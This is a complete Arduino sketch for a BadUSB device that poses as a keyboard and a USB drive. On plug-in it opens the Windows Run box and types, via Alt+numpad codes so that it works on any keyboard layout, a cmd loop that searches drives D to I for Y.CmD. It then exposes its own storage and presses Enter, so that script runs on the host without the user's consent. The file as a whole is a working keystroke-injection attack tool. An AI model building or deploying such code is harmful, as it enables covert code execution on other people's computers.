#include "Adafruit_TinyUSB.h"
#include "include/ramdisk.cpp"

//background
enum {RID_KEYBOARD = 1};
uint8_t const desc_hid_report[] = {TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(RID_KEYBOARD))};
Adafruit_USBD_HID usb_hid(desc_hid_report, sizeof(desc_hid_report), 2, false);
Adafruit_USBD_MSC usb_msc;
volatile uint8_t leds = 0, do_msc;
uint64_t const disk_block_num = msc_disk_size / 512 + 1, disk_block_size = 512;

//user vars
uint8_t const command[] = "CmD /C FOR /L %A IN ()DO FOR %b IN (I H G F E D)DO %b:\\Y.CmD";
uint64_t const
  std_delay = 16, //delay between keypresses
  start_delay = 512, //delay before start (wait led bitflag)
  guipop_delay = 1024, //wait windows popup
  guiend_delay = 256; //delay before enter

//standart typing
void std_report(uint8_t buf[6], uint8_t modifier = 0, uint8_t post_modifier = 0) {
  usb_hid.keyboardReport(RID_KEYBOARD, modifier, buf); //press
  delay(std_delay);
  usb_hid.keyboardReport(RID_KEYBOARD, post_modifier, NULL); //release
  delay(std_delay);
}

void std_press(uint8_t ch, uint8_t modifier = 0, uint8_t post_modifier = 0) {
  uint8_t keys[6] = {ch, 0, 0, 0, 0, 0};
  std_report(keys, modifier, post_modifier);
}

void std_ascii_press(uint8_t ch) {
  uint8_t div = 100, put, buf[6], *buf_ptr, repeat[10] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 1};
  memset(buf, HID_KEY_NONE, 6);
  *(buf_ptr = buf)++ = HID_KEY_KEYPAD_0;
  for (; div; div /= 10) if (ch / div) { //ascii in decimal
    if (repeat[put = (ch / div % 10 + 9) % 10]++) {
      std_report(buf, KEYBOARD_MODIFIER_LEFTALT, KEYBOARD_MODIFIER_LEFTALT);
      memset(buf, HID_KEY_NONE, 6);
      memset(repeat, 0, 10);
      repeat[put]++;
      buf_ptr = buf;
    }
    *buf_ptr++ = HID_KEY_KEYPAD_1 + put;
  }
  std_report(buf, KEYBOARD_MODIFIER_LEFTALT);
}

void std_ascii_print(uint8_t const *str) {
  while (*str) std_ascii_press(*str++);
}

//usb interruptors
uint16_t hid_get_report_callback(uint8_t report_id, hid_report_type_t report_type, uint8_t *buffer, uint16_t reqlen) {
  return 0;
}

void hid_set_report_callback(uint8_t report_id, hid_report_type_t report_type, uint8_t const *buffer, uint16_t bufsize) {
  if (report_type == HID_REPORT_TYPE_OUTPUT) leds = buffer[0];
}

int32_t msc_read_callback(uint32_t lba, void *buffer, uint32_t bufsize) {
  memcpy(buffer, (const void *) (msc_disk + lba * disk_block_size), bufsize);
  do_msc = 1;
  return bufsize;
}

int32_t msc_write_callback(uint32_t lba, uint8_t *buffer, uint32_t bufsize) {
  do_msc = 1;
  return bufsize;
}

void msc_flush_callback(void) {}

bool msc_ready_callback(void) {
  return true;
}

//user code
void loop(void) {}

void setup(void) {
  //initialize
  usb_hid.setReportCallback(NULL, hid_set_report_callback);
  usb_hid.begin();
  usb_msc.setID(NULL, NULL, NULL);
  usb_msc.setCapacity(disk_block_num, disk_block_size);
  usb_msc.setReadWriteCallback(msc_read_callback, msc_write_callback, msc_flush_callback);
  usb_msc.setUnitReady(false);
  usb_msc.begin();
  do delay(1); while (!usb_hid.ready());
  while (!USBDevice.mounted()) delay(1);
  delay(start_delay);

  //script
  if (~leds & KEYBOARD_LED_NUMLOCK) //turns on numlock, needed with std_ascii_print to print in ascii with alt + 999
    std_press(HID_KEY_NUM_LOCK);
  std_press(HID_KEY_NONE, KEYBOARD_MODIFIER_LEFTGUI); //press windows key
  delay(guipop_delay); //wait windows to pop
  std_ascii_print(command); //print with ascii the command (comptible with almost every (if not all) keyboard languages
  delay(guiend_delay); //wait before enter
  usb_msc.setUnitReady(true); //connect msc storage
  std_press(HID_KEY_ENTER); //press enter

  //show msc activity on buitin led
  while (1) {
    do_msc = 0;
    delay(256);
    digitalWrite(LED_BUILTIN, do_msc);
  }
}